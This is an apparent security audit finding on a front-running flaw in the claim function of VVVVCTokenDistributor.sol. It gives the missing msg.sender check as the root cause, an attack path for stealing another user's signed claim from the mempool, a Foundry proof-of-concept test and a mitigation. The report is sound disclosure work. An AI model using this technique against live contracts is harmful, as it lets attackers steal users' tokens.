# Front-Running Vulnerability in `VVVVCTokenDistributor.sol::claim` Function


Front-Running Vulnerability in `VVVVCTokenDistributor.sol::claim` Function

## Summary

A critical front-running vulnerability has been identified in the `claim` function of the `VVVVCTokenDistributor.sol` contract. This vulnerability allows an attacker to intercept and execute a claim transaction before the legitimate user, resulting in the unauthorized transfer of tokens to the attacker. The root cause is the lack of proper authorization checks to verify that the caller is authorized to claim tokens on behalf of the specified KYC address.



## Root Cause

Lack of Caller Verification: The `VVVVCTokenDistributor.sol::claim` function does not verify that `msg.sender` is the `kycAddress`. This allows any user to call the function with valid `ClaimParams` and receive the tokens.

```javascript
projectToken.safeTransferFrom(
    _params.projectTokenProxyWallets[i],
@>  msg.sender, // Tokens are transferred to msg.sender without verifying authorization
    _params.tokenAmountsToClaim[i]
);
```







## Attack Path

- Alice, a legitimate user with a verified kycAddress, prepares to call the claim function with her `ClaimParams` and signature.
- An attacker, Bob, monitors the network and observes Alice's pending transaction in the mempool.
- Bob extracts the `ClaimParams` and signature from Alice's transaction.
- He submits his own transaction to the `claim` function with the same `ClaimParams` and he is the caller (msg.sender).
- Bob's transaction is processed before Alice's, due to higher gas fees or network conditions.
- The contract transfers the tokens to Bob's address.
- The nonce for Alice's kycAddress is updated, invalidating her transaction.
- Bob successfully receives the tokens intended for Alice.
Alice's transaction fails with an InvalidNonce error, and she cannot claim her tokens without obtaining a new signature.



## Impact

- Financial Loss: Protocol and Users will suffer financial losses due to stolen tokens.
- Unauthorized Token Transfers: Attackers can intercept and claim tokens intended for legitimate users.
- Denial of Service: Legitimate users are prevented from claiming their tokens due to nonce invalidation.




## POC

add this to `VVVVCTokenDistributor.unit.t.sol`:

```javascript
    // Test that an attacker can front-run a legitimate claim
    function testFrontRunningAttack() public {
        // Step 1: Generate claim parameters and signature intended for the legitimate user (sampleKycAddress)
        VVVVCTokenDistributor.ClaimParams memory claimParams = generateClaimParamsWithSignature(
            sampleKycAddress, // Legitimate KYC address
            projectTokenProxyWallets,
            sampleTokenAmountsToClaim
        );

        // Step 2: Simulate the attacker's address
        address attacker = address(0xDEADBEEF);
        uint256 attackerBalance = ProjectTokenInstance.balanceOf(attacker);
        assertEq(attackerBalance, 0, "Attacker dont have 0 tokens");

        // Step 3: The attacker front-runs the transaction by submitting the same claim parameters
        vm.startPrank(attacker, attacker);
        TokenDistributorInstance.claim(claimParams);
        vm.stopPrank();

        // Step 4: Verify that the attacker received the tokens
        attackerBalance = ProjectTokenInstance.balanceOf(attacker);
        assertEq(attackerBalance, sum(sampleTokenAmountsToClaim), "Attacker did not receive the tokens");
        assertGt(attackerBalance, 0, "Attacker did not receive the tokens");

        // Step 5: Now, the legitimate user tries to claim with the same parameters
        vm.startPrank(sampleKycAddress, sampleKycAddress);
        vm.expectRevert(VVVVCTokenDistributor.InvalidNonce.selector);
        TokenDistributorInstance.claim(claimParams);
        vm.stopPrank();

        // Step 6: Verify that the legitimate user did not receive any tokens
        uint256 userBalance = ProjectTokenInstance.balanceOf(sampleKycAddress);
        assertEq(userBalance, 0, "Legitimate user should not have received tokens");

        // Step 7: Output a message indicating the test demonstrates the vulnerability
        emit log("Front-running attack successful: Attacker claimed tokens intended for legitimate user");
    }
```

## Mitigation

Implement an authorization check in the claim function to ensure that only the kycAddress or an authorized alias can initiate the claim.
